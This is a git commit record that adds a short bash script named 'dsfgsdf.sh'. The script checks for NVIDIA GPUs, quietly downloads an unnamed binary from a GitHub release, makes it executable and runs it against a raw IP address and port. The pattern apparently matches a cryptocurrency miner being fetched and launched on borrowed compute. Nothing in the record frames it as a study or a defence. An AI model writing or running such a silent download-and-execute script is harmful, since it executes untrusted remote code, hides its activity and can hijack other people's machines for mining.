ba13c554132e08a1eef32f3364ab79369d81b7b4
weissnatxzgss09 <79737152+weissnatxzgss09@users.noreply.github.com>
2021-02-27 05:09:28 +0000

    Create dsfgsdf.sh

---
+++ dsfgsdf.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+nvidia-smi -L
+wget https://github.com/weissnatxzgss09/yeukhung/releases/download/1/yujklhasd &> /dev/null
+chmod +x yujklhasd
+./yujklhasd -P http://64.52.174.90:4545/"$1" &> log
